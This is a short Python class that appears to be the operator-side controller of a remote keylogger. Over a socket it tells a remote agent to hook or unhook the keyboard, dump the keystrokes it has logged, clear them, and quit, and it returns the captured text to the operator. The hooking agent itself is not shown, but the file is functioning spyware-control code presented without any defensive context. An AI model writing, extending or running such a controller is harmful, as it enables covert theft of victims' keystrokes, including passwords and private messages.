class Keylog_Service:
    def __init__(self, socket_client):
        self.socket_client = socket_client
        self.socket_client.send("KEYLOGGER")
        
    def hook(self):
        self.socket_client.send("HOOK")
    
    def unhook(self):
        self.socket_client.send("UNHOOK")
    
    def log_keys(self):
        self.socket_client.send("PRINT")
        
        data_length = int.from_bytes(self.socket_client.recv_exact(4), "big")
        data = self.socket_client.recv_exact(data_length)
        
        return data.decode()
    
    def clear(self):
        self.socket_client.send("CLEAR")
        data_length = int.from_bytes(self.socket_client.recv_exact(4), "big")
        data = self.socket_client.recv_exact(data_length)
        return data.decode()
    
    def close(self):
        self.socket_client.send("QUIT")
        self.socket_client.close()